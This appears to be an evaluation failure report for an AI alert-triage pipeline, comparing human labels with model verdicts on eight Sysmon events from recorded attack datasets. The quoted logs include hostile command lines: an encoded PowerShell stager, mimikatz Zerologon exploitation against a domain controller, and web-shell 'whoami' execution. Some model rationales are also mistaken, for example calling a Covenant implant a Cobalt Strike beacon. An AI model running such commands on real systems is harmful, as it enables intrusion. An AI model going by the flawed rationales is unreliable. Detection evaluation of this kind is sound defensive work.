# Failures: rag

8 failures out of 30 rows (dev; 0 transport errors skipped). Model openrouter:nvidia/nemotron-3-super-120b-a12b:free, prompt 2edd88418b70, labels b0695a44d0d4.

Hints (guesses, not buckets): reasoning error? 2, retrieval miss? 6

---
### day2-031  (verdict true_positive != benign_noisy)

**hint:** reasoning error?  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `empire_schtasks_creation_standard_user.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `NT AUTHORITY\SYSTEM`
- process `C:\windows\system32\svchost.exe`
- registry `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MordorSchtask\SD` = `Binary Data`

**Label:** benign_noisy [] by `Mouheb+Partner`: Task Scheduler recording metadata for a newly created task; fires the same way for any task regardless of intent.
**Model:** true_positive ['T1053.005'] (confidence 0.85), tier 1

> The event shows svchost.exe modifying a registry key under TaskCache for a scheduled task named 'MordorSchtask', which is indicative of persistence via a scheduled task (T1053.005). The task name is not a known Windows task, suggesting malicious activity.

**Retrieved techniques (top 5):** ['T1547.001', 'T1053.005', 'T1218.002', 'T1003.001', 'T1197']  
**Retrieved Sigma rules:** ['4720b7df-40c3-48fd-bbdf-fd4b3c464f0d', 'cbf93e5d-ca6c-4722-8bea-e9119007c248', '480421f9-417f-4d3b-9552-fd2728443ec8', '20f0ee37-5942-4e45-b7d5-c5b5db9df5cd', '02ee49e2-e294-4d0f-9278-f5b3212fc588']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/9fbb641bee8fcb91e446b49d2ca7ee6a

---

### day3-176  (technique credit 0.25)

**hint:** reasoning error?  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `empire_psexec_dcerpc_tcp_svcctl.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION6.theshire.local`, user `NT AUTHORITY\SYSTEM`
- process `C:\Windows\System32\cmd.exe`
- command line `C:\windows\system32\cmd.exe /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAEUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANAAzAEQARQAyA... (+4599)`
- parent `C:\Windows\System32\services.exe` `C:\windows\system32\services.exe`

**Label:** true_positive ['T1569.002'] by `Mouadh`: cmd.exe started by services.exe running 'start /b powershell -enc' is a remote service executing an encoded stager (PsExec-style).
**Model:** true_positive ['T1059.001', 'T1059.003'] (confidence 0.95), tier 1
**Technique credit:** 0.25

> The event shows cmd.exe (launched from services.exe) executing a heavily obfuscated PowerShell command via the -enc flag, which includes typical evasion parameters (-noP -sta -w 1). This indicates adversary use of PowerShell for execution, consistent with T1059.001, and the use of cmd.exe to launch it reflects indirect command shell usage (T1059.003).

**Retrieved techniques (top 5):** ['T1059.003', 'T1543.003', 'T1543', 'T1569.002', 'T1202']  
**Retrieved Sigma rules:** ['79f4ede3-402e-41c8-bc3e-ebbf5f162581', '17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8', 'ab37a6ec-6068-432b-a64e-2c7bf95b1d22', '138d3531-8793-4f50-a2cd-f291b2863d78', '5a6b7c8d-9e0f-1a2b-3c4d-5e6f7a8b9c0d']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/5001845ae054506e338571215ac5ce04

---

### day3-071  (technique credit 0.00)

**hint:** retrieval miss? (T1021.003 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `covenant_dcom_executeexcel4macro_allowed.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Users\pgustavo\Desktop\MoveExcel4.exe`
- command line `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
- parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Desktop\MoveExcel4.exe 172.18.39.6`

**Label:** true_positive ['T1021.003'] by `Mouadh`: MoveExcel4.exe <IP> uses DCOM to run an Excel 4.0 macro on a remote host.
**Model:** true_positive ['T1059.003'] (confidence 0.8), tier 1
**Technique credit:** 0.00

> The user executed a non-system executable (MoveExcel4.exe) from their desktop via cmd.exe /c, passing an internal IP address as an argument, indicating abuse of the Windows command shell to run a potentially malicious tool for lateral movement or execution.

**Retrieved techniques (top 5):** ['T1546.008', 'T1570', 'T1574.008', 'T1204.002', 'T1059.003']  
**Retrieved Sigma rules:** ['a16980c2-0c56-4de0-9a79-17971979efdd', '502b42de-4306-40b4-9596-6f590c81f073', '1c0e41cd-21bb-4433-9acc-4a2cd6367b9b', 'fff9d2b7-e11c-4a69-93d3-40ef66189767', '10c14723-61c7-4c75-92ca-9af245723ad2']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/05d86ca7e4c46dc5d268074cad25cc8f

---

### day3-166  (verdict needs_review != true_positive; technique credit 0.25)

**hint:** retrieval miss? (T1021.003 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `covenant_dcom_executeexcel4macro_blocked.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Users\pgustavo\Desktop\MoveExcel4.exe`
- command line `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
- parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Desktop\MoveExcel4.exe 172.18.39.6`

**Label:** true_positive ['T1021.003'] by `Mouadh`: MoveExcel4.exe <IP> attempts DCOM lateral movement by remote Excel 4.0 macro execution.
**Model:** needs_review ['T1570'] (confidence 0.55), tier 2, escalated: confidence 0.60 < 0.7
**Technique credit:** 0.25

> An unknown executable (MoveExcel4.exe) on a user's Desktop is invoked with a private IP address (172.18.39.6) as an argument via cmd.exe. The filename and IP argument suggest possible lateral tool transfer or custom network tooling, but no malicious behavior is directly observed and the tool could be legitimate admin software.

**Retrieved techniques (top 5):** ['T1546.008', 'T1570', 'T1574.008', 'T1204.002', 'T1059.003']  
**Retrieved Sigma rules:** ['a16980c2-0c56-4de0-9a79-17971979efdd', '502b42de-4306-40b4-9596-6f590c81f073', '1c0e41cd-21bb-4433-9acc-4a2cd6367b9b', 'fff9d2b7-e11c-4a69-93d3-40ef66189767', '10c14723-61c7-4c75-92ca-9af245723ad2']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/2d11c53287edcc5b8261eda6a63d964c

---

### day3-048  (verdict benign_noisy != true_positive; technique credit 0.00)

**hint:** retrieval miss? (T1134 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `aptsimulator_cobaltstrike.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5`, user `WORKSTATION5\APT-Simulator`
- process `C:\TMP\CreateNamedPipe.exe`
- command line `"C:\TMP\CreateNamedPipe.exe"  MSSE-1337-server`
- parent `C:\Windows\System32\cmd.exe` `"C:\Windows\system32\cmd.exe" `

**Label:** true_positive ['T1134'] by `Mouadh`: CreateNamedPipe.exe creating a pipe named MSSE-1337-server matches the Cobalt Strike getsystem named-pipe pattern; the event shows the pipe, not the impersonation, so the parent technique.
**Model:** benign_noisy [] (confidence 0.7), tier 1
**Technique credit:** 0.00

> The process is a custom executable named CreateNamedPipe.exe run from C:/TMP by a user labeled APT-Simulator, indicating a test or simulation rather than actual adversary activity. No clear malicious behavior (e.g., credential access, lateral movement) is observed in the event.

**Retrieved techniques (top 5):** ['T1059.003', 'T1574.008', 'T1003.001', 'T1204.002', 'T1218.014']  
**Retrieved Sigma rules:** ['3c89a1e8-0fba-449e-8f1b-8409d6267ec8', 'a16980c2-0c56-4de0-9a79-17971979efdd', '8e0bb260-d4b2-4fff-bb8d-3f82118e6892', 'f53714ec-5077-420e-ad20-907ff9bb2958', '044ba588-dff4-4918-9808-3f95e8160606']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/d6648063db43949ad92bca059b5a4e30

---

### day3-095  (technique credit 0.00)

**hint:** retrieval miss? (T1190 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `proxylogon_ssrf_rce_poc.zip`

Event 0:
- source `windows_sysmon`, host `MXS01.azsentinel.local`, user `NT AUTHORITY\SYSTEM`
- process `C:\Windows\System32\cmd.exe`
- command line `cmd /c whoami`
- parent `C:\Windows\System32\inetsrv\w3wp.exe` `c:\windows\system32\inetsrv\w3wp.exe -ap "MSExchangeOWAAppPool" -v "v4.0" -c "C:\Program Files\Microsoft\Exchange Server\V15\bin\GenericAppPoolConfigWithGCServerEnabledFalse.config" -a \\.\pipe\iisipm8e72bd3c-90fe-435f-bda2-fdb8731bc136 -h "C:\inetpub\temp\apppools\MSExchangeOWAAppPool\MSExchangeOWAAppPool.config" -w "" -m 0`

**Label:** true_positive ['T1190'] by `Mouadh`: cmd /c whoami spawned by the IIS worker process w3wp.exe means code execution inside the web server, the ProxyLogon result.
**Model:** true_positive ['T1059.001'] (confidence 0.85), tier 1
**Technique credit:** 0.00

> The event shows a cmd.exe process spawned from an IIS worker process (w3wp.exe) executing 'whoami', which is atypical for legitimate IIS behavior and indicates command-line discovery via a web shell. This matches adversary use of Windows Command Shell for execution and discovery.

**Retrieved techniques (top 5):** ['T1559.002', 'T1218.014', 'T1505.002', 'T1574.014', 'T1218.003']  
**Retrieved Sigma rules:** ['797011dc-44f4-4e6f-9f10-a8ceefbe566b', 'b730a276-6b63-41b8-bcf8-55930c8fc6ee', '2617e7ed-adb7-40ba-b0f3-8f9945fe6c09', 'e4a6b256-3e47-40fc-89d2-7a477edd6915', 'a35f5a72-f347-4e36-8895-9869b0d5fc6d']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/a9d34e4fb7a1ec43b64e31a80f017fc1

---

### day3-113  (technique credit 0.00)

**hint:** retrieval miss? (T1210 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Windows\System32\cmd.exe`
- command line `"cmd.exe" /c C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
- parent `C:\Users\pgustavo\Desktop\GruntHTTP.exe` `"C:\Users\pgustavo\Desktop\GruntHTTP.exe" `

**Label:** true_positive ['T1210'] by `Mouadh`: cmd.exe /c mimikatz.exe "lsadump::zerologon ... /exploit" spawned by GruntHTTP.exe, a Covenant C2 implant: the command line shows the Zerologon (CVE-2020-1472) exploit against a domain controller.
**Model:** true_positive ['T1212'] (confidence 0.95), tier 1
**Technique credit:** 0.00

> The event shows cmd.exe executing mimikatz with the Zerologon exploit module (lsadump::zerologon) targeting a domain controller, which is an exploitation attempt to obtain credentials. The parent process is GruntHTTP.exe, a known Cobalt Strike beacon, indicating malicious intent.

**Retrieved techniques (top 5):** ['T1204.002', 'T1546.008', 'T1003.001', 'T1203', 'T1204']  
**Retrieved Sigma rules:** ['502b42de-4306-40b4-9596-6f590c81f073', '631b22a4-70f4-4e2f-9ea8-42f84d9df6d8', '5a6b7c8d-9e0f-1a2b-3c4d-5e6f7a8b9c0d', 'a642964e-bead-4bed-8910-1bb4d63e3b4d', '1dd05363-104e-4b4a-b963-196a534b03a1']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/b08aaaa9770ac8cb34d37492e29469b2

---

### day3-151  (technique credit 0.00)

**hint:** retrieval miss? (T1210 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe`
- command line `C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe  "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
- parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`

**Label:** true_positive ['T1210'] by `Mouadh`: mimikatz lsadump::zerologon /target exploits CVE-2020-1472 (Zerologon) against a domain controller.
**Model:** true_positive ['T1003.001'] (confidence 0.95), tier 1
**Technique credit:** 0.00

> The event shows execution of Mimikatz with the lsadump::zerologon module targeting a domain controller, which is a known credential‑access technique that extracts authentication material from LSASS/Nlogon. This matches the HackTool - Mimikatz Execution Sigma rule and indicates adversary behavior, not benign activity.

**Retrieved techniques (top 5):** ['T1204.002', 'T1003.001', 'T1546.008', 'T1203', 'T1574.008']  
**Retrieved Sigma rules:** ['502b42de-4306-40b4-9596-6f590c81f073', 'a642964e-bead-4bed-8910-1bb4d63e3b4d', '5a6b7c8d-9e0f-1a2b-3c4d-5e6f7a8b9c0d', 'f26307d8-14cd-47e3-a26b-4b4769f24af6', '1dd05363-104e-4b4a-b963-196a534b03a1']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/1684a15dce8050c6527443f30eac623e
